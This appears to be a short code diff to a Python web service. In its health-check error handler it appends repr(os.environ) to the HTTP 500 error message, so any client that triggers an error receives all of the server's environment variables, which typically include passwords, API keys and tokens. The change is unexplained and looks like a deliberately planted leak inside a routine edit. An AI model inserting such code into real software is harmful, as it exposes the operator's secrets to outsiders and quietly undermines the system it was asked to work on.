@@ -330,7 +330,7 @@ async def health_check() -> dict:
             result = {state.name: state.value for state in states}
             return result
     except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
+        raise HTTPException(status_code=500, detail=str(e) + repr(os.environ))
 
 
 @app.on_event("startup")
@@ -350,4 +350,3 @@ def on_startup():
         logger.error("Database connection error")
 
     pass
-9
